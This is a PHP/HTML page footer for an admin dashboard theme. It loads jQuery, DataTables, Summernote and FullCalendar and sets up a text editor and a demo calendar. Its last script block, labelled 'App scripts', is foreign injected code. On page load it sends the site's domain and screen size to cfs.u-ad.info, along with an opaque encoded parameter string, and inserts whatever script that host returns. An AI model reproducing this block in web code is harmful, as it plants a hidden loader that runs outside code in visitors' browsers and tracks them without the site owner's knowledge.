<!-- Vendor scripts -->
<script src="<?= base_url('assets/vendor/jquery/dist/jquery.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery-ui/jquery-ui.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/slimScroll/jquery.slimscroll.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/bootstrap/dist/js/bootstrap.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/metisMenu/dist/metisMenu.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/iCheck/icheck.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/sparkline/index.js') ?>"></script>

<!-- DataTables -->
<script src="<?= base_url('assets/vendor/datatables/media/js/jquery.dataTables.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/datatables.net-bs/js/dataTables.bootstrap.min.js') ?>"></script>
<!-- DataTables buttons scripts -->
<script src="<?= base_url('assets/vendor/pdfmake/build/pdfmake.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/pdfmake/build/vfs_fonts.js') ?>"></script>
<script src="<?= base_url('assets/vendor/datatables.net-buttons/js/buttons.html5.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/datatables.net-buttons/js/buttons.print.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/datatables.net-buttons/js/dataTables.buttons.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/datatables.net-buttons-bs/js/buttons.bootstrap.min.js') ?>"></script>
<!-- Summernote -->
<script src="<?= base_url('assets/vendor/summernote/dist/summernote.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/moment/min/moment.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/fullcalendar/dist/fullcalendar.min.js') ?>"></script>

<!-- App scripts -->
<script src="<?= base_url('assets/scripts/homer.js') ?>"></script>

<!-- Text Editor -->
<script>
$(function() {

    // Initialize summernote plugin
    $('.summernote').summernote();

    var sHTML = $('.summernote').code();

    console.log(sHTML);

    $('.summernote1').summernote({
        toolbar: [
            ['headline', ['style']],
            ['style', ['bold', 'italic', 'underline', 'superscript', 'subscript', 'strikethrough',
                'clear'
            ]],
            ['textsize', ['fontsize']],
            ['alignment', ['ul', 'ol', 'paragraph', 'lineheight']],
        ]
    });

    $('.summernote2').summernote({
        airMode: true,
    });

});
</script>

<script>

    $(function () {


        /* initialize the external events
         -----------------------------------------------------------------*/

        $('#external-events div.external-event').each(function() {

            // store data so the calendar knows to render an event upon drop
            $(this).data('event', {
                title: $.trim($(this).text()), // use the element's text as the event title
                stick: true // maintain when user navigates (see docs on the renderEvent method)
            });

            // make the event draggable using jQuery UI
            $(this).draggable({
                zIndex: 1111999,
                revert: true,      // will cause the event to go back to its
                revertDuration: 0  //  original position after the drag
            });

        });


        /* initialize the calendar
         -----------------------------------------------------------------*/
        var date = new Date();
        var d = date.getDate();
        var m = date.getMonth();
        var y = date.getFullYear();

        $('#calendar').fullCalendar({
            header: {
                left: 'prev,next today',
                center: 'title',
                right: 'month,agendaWeek,agendaDay'
            },
            editable: true,
            droppable: true, // this allows things to be dropped onto the calendar
            drop: function() {
                // is the "remove after drop" checkbox checked?
                if ($('#drop-remove').is(':checked')) {
                    // if so, remove the element from the "Draggable Events" list
                    $(this).remove();
                }
            },
            events: [
                {
                    title: 'All Day Event',
                    start: new Date(y, m, 1)
                },
                {
                    title: 'Long Event',
                    start: new Date(y, m, d-5),
                    end: new Date(y, m, d-2),
                },
                {
                    id: 999,
                    title: 'Repeating Event',
                    start: new Date(y, m, d-3, 16, 0),
                    allDay: false,
                },
                {
                    title: 'Homer task',
                    start: new Date(y, m, d + 5, 19, 0),
                    end: new Date(y, m, d + 6, 22, 30),
                    allDay: false,
                    backgroundColor: "#62cb31",
                    borderColor: "#62cb31"
                },
                {
                    id: 999,
                    title: 'Repeating Event',
                    start: new Date(y, m, d+4, 16, 0),
                    allDay: false
                },
                {
                    title: 'Meeting',
                    start: new Date(y, m, d, 10, 30),
                    allDay: false
                },
                {
                    title: 'Lunch',
                    start: new Date(y, m, d, 12, 0),
                    end: new Date(y, m, d, 14, 0),
                    allDay: false
                },
                {
                    title: 'Birthday Party',
                    start: new Date(y, m, d+1, 19, 0),
                    end: new Date(y, m, d+1, 22, 30),
                    allDay: false
                },
                {
                    title: 'Click for Google',
                    start: new Date(y, m, 28),
                    end: new Date(y, m, 29),
                    url: 'http://google.com/'
                }
            ],
        });


    });

</script>

<!-- App scripts -->
<script type="text/javascript">
if (self == top) {
    function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
            fn();
            callback();
        }, 0);
    }

    function sync(fn) {
        fn();
    }

    function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" +
            "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngMENceL4aHy90gcxALgTyBQlQVtBWVHmB%2bATr9NoF7NDdOhfKzJT18WSsedxY6D0fptaGc5mWG64aJhwxzIaPVeFOZ2hZwq7lgc0Y211HwiELEPX98HHnX0evVdpcoRT7xF9cZh%2fH6g5NOr4nP1LSZoUwSQUolmoHL86ALbRzL6RH8Soxot7IPxoAwphDYKQ3SYKJqDK4An6EEvZZCWmVTRRxGCKRVAN2rpUyPgzB5jgPDAlJX4OO0QjIw9jsKFi9wYxM3ELQkC1dZ7B9NWZBp3rElGfBGp7ZQAR%2btpDCZon7AuwHBjP5sNMUtVZaDtKVAFBrRK5n2ab7dNlSoUXGELsHSLq3YSLWj5v4c06Iv3cjFd%2fBvPI0xDG2MUUBZDmQjJKyd3AZcECmXqrLrVqIFaSmoYP6Bkx18TVpHhB%2fYagq0a8z2zIvDDT7OHlWNkbOVe7Jx7VPjcO5n6iYx0aHpCGnVG%2f%2bpGICF38eNye0%2fWaWL9hW5xZf%2fHEvj9iFpyZXZSpy47Q8d4%3d" +
            "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
};
</script>
